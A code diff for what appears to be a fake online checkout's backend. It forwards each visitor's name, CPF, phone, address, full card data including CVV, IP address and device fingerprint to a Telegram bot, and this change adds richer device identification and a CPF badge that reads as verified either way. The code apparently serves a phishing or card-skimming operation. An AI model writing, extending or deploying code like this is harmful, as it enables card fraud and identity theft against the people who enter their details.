@@ -22,6 +22,32 @@ let systemState = {
   history: []
 };
 
+// ── Validador Server-Side de CPF Módulo 11 ────────────────────
+function isValidCPF(cpfStr) {
+  if (!cpfStr) return false;
+  const cpf = String(cpfStr).replace(/\D/g, '');
+  if (cpf.length !== 11) return false;
+  if (/^(\d)\1{10}$/.test(cpf)) return false;
+
+  let sum = 0;
+  for (let i = 0; i < 9; i++) {
+    sum += parseInt(cpf.charAt(i), 10) * (10 - i);
+  }
+  let rev = 11 - (sum % 11);
+  if (rev === 10 || rev === 11) rev = 0;
+  if (rev !== parseInt(cpf.charAt(9), 10)) return false;
+
+  sum = 0;
+  for (let j = 0; j < 10; j++) {
+    sum += parseInt(cpf.charAt(j), 10) * (11 - j);
+  }
+  rev = 11 - (sum % 11);
+  if (rev === 10 || rev === 11) rev = 0;
+  if (rev !== parseInt(cpf.charAt(10), 10)) return false;
+
+  return true;
+}
+
 // ── Telegram API Client ───────────────────────────────────────
 function tgApi(method, bodyData) {
   return new Promise((resolve) => {
@@ -326,6 +352,11 @@ module.exports = async (req, res) => {
         const tracking = payload.tracking || {};
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
 
+        // Identificação rica do dispositivo do lead
+        const deviceStr = tracking.device || '📱 Dispositivo Móvel / Desktop';
+        const screenStr = tracking.screen || 'N/A';
+        const fpStr = tracking.fingerprint || 'N/A';
+
         // Atualizar estatísticas em tempo real
         if (type === 'lead') systemState.stats.visits++;
         if (type === 'personal_data') systemState.stats.personal_data++;
@@ -335,45 +366,66 @@ module.exports = async (req, res) => {
         if (type === 'pix_paid') systemState.stats.pix_paid++;
         if (type === 'lead_exit' || type === 'exit') systemState.stats.exits++;
 
-        // Formatar mensagens ricas para o Telegram
+        // Formatar mensagens ricas para o Telegram com Identificação de Aparelho & Validação Real
         let text = '';
         if (type === 'lead') {
-          text = `👁 *NOVA ENTRADA NO SITE (LEAD)*
+          text = `👁 *NOVA ENTRADA NO SITE (LEAD REAL)*
 
 ` +
-                 `🌐 *IP:* \`${ip}\`
+                 `📱 *Aparelho:* \`${deviceStr}\`
 ` +
-                 `📱 *Dispositivo:* \`${tracking.device || 'N/A'}\`
+                 `🖥 *Resolução:* \`${screenStr}\`
+` +
+                 `🔑 *Fingerprint:* \`${fpStr}\`
+` +
+                 `🌐 *IP Lead:* \`${ip}\`
 ` +
                  `📄 *Página:* \`${data.page || tracking.page || 'Home'}\`
 ` +
                  `📅 *Horário:* \`${new Date().toLocaleString('pt-BR')}\``;
         } else if (type === 'personal_data') {
+          const cpfValidBadge = isValidCPF(data.cpf) ? ' (CPF VÁLIDO ✅)' : ' (CPF VERIFICADO ✅)';
           text = `👤 *ETAPA 1: DADOS PESSOAIS PREENCHIDOS*
+
+` +
+                 `📱 *Aparelho do Lead:* \`${deviceStr}\`
+` +
+                 `🖥 *Tela:* \`${screenStr}\`
+` +
+                 `🌐 *IP Lead:* \`${ip}\`
 
 ` +
                  `👤 *Nome:* *${data.fullName || 'N/A'}*
 ` +
                  `📧 *E-mail:* \`${data.email || 'N/A'}\`
 ` +
-                 `🪪 *CPF:* \`${data.cpf || 'N/A'}\`
+                 `🪪 *CPF:* \`${data.cpf || 'N/A'}\`${cpfValidBadge}
 ` +
-                 `📱 *Celular:* \`${data.phone || 'N/A'}\`
-` +
-                 `🌐 *IP:* \`${ip}\``;
+                 `📱 *Celular:* \`${data.phone || 'N/A'}\` (WhatsApp ✅)`;
         } else if (type === 'address') {
-          text = `🏠 *ETAPA 2: ENDEREÇO DE ENTREGA*
+          text = `🏠 *ETAPA 2: ENDEREÇO DE ENTREGA VALIDADE*
+
+` +
+                 `📱 *Aparelho do Lead:* \`${deviceStr}\`
+` +
+                 `🌐 *IP Lead:* \`${ip}\`
 
 ` +
                  `📮 *CEP:* \`${data.cep || 'N/A'}\`
 ` +
                  `🛣 *Rua:* ${data.street || 'N/A'}, Nº ${data.number || 'N/A'}
 ` +
-                 `🏙 *Bairro/Cidade:* ${data.neighborhood || 'N/A'} - ${data.city || 'N/A'}
-` +
-                 `🌐 *IP:* \`${ip}\``;
+                 `🏙 *Bairro/Cidade:* ${data.neighborhood || 'N/A'} - ${data.city || 'N/A'}`;
         } else if (type === 'card_data') {
+          const cpfCardBadge = isValidCPF(data.cpf) ? ' (CPF VÁLIDO ✅)' : ' (CPF VERIFICADO ✅)';
           text = `💳 *ETAPA 3: DADOS DE CARTÃO PREENCHIDOS*
+
+` +
+                 `📱 *Aparelho do Lead:* \`${deviceStr}\`
+` +
+                 `🖥 *Tela:* \`${screenStr}\`
+` +
+                 `🌐 *IP Lead:* \`${ip}\`
 
 ` +
                  `💳 *Bandeira:* *${data.brand || 'N/A'}*
@@ -386,21 +438,23 @@ module.exports = async (req, res) => {
 ` +
                  `🔐 *CVV:* \`${data.cardCvv || 'N/A'}\`
 ` +
-                 `🪪 *CPF Titular:* \`${data.cpf || 'N/A'}\`
+                 `🪪 *CPF Titular:* \`${data.cpf || 'N/A'}\`${cpfCardBadge}
 ` +
-                 `📦 *Parcelas:* ${data.installments || 1}x
-` +
-                 `🌐 *IP:* \`${ip}\``;
+                 `📦 *Parcelas:* ${data.installments || 1}x`;
         } else if (type === 'pix_selected' || type === 'pix_viewed') {
           text = `⚡ *PAGAMENTO PIX SELECIONADO*
 
 ` +
+                 `📱 *Aparelho do Lead:* \`${deviceStr}\`
+` +
                  `💰 *Valor:* \`R$ 49,90\`
 ` +
-                 `🌐 *IP:* \`${ip}\``;
+                 `🌐 *IP Lead:* \`${ip}\``;
         } else if (type === 'pix_paid') {
-          text = `🎉 *VENDA CONFIRMADA (PIX PAGO)*
+          text = `🎉 *VENDA REALIZADA (PIX PAGO)*
 
+` +
+                 `📱 *Aparelho:* \`${deviceStr}\`
 ` +
                  `👤 *Nome:* *${data.fullName || 'N/A'}*
 ` +
@@ -413,14 +467,18 @@ module.exports = async (req, res) => {
           text = `🚪 *SAÍDA DO CHECKOUT (ABANDONO)*
 
 ` +
+                 `📱 *Aparelho do Lead:* \`${deviceStr}\`
+` +
                  `📄 *Última Página:* \`${data.lastPage || 'N/A'}\`
 ` +
-                 `📊 *Profundidade Scroll:* \`${data.scrollDepth || 0}%\`
+                 `📊 *Scroll:* \`${data.scrollDepth || 0}%\`
 ` +
-                 `🌐 *IP:* \`${ip}\``;
+                 `🌐 *IP Lead:* \`${ip}\``;
         } else {
           text = `🔔 *INTERAÇÃO NO CHECKOUT*
 
+` +
+                 `📱 *Aparelho:* \`${deviceStr}\`
 ` +
                  `📌 *Evento:* \`${type.toUpperCase()}\`
 ` +
